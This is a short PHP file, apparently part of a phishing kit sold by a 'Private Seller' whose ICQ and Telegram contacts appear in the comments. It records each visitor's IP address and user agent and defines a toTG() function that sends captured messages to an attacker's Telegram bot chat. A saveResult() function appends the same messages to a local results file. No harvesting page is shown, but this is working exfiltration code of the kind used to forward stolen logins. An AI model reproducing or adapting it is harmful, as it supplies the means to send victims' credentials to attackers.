<?php
/*
Author : Private Seller
ICQ : @pseller200
https://t.me/pseller200
*/
$agent = $_SERVER['HTTP_USER_AGENT'];
$ip = "";
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
	$ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
	$ip = $_SERVER['REMOTE_ADDR'];
}

function toTG($msg){
// telegram
global $chat,$token ;
	$url = "https://api.telegram.org/bot" . $token . "/sendMessage?parse_mode=html&chat_id=-" . $chat;
    $url = $url . "&text=" . urlencode($msg);
	

    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
 
}


function saveResult($msg){
	global $result;
	$op = fopen($result,'a+');
	fwrite($op,$msg);
	fclose($op);
}

/*
Author : Private Seller
ICQ : @pseller200
https://t.me/pseller200
*/
?>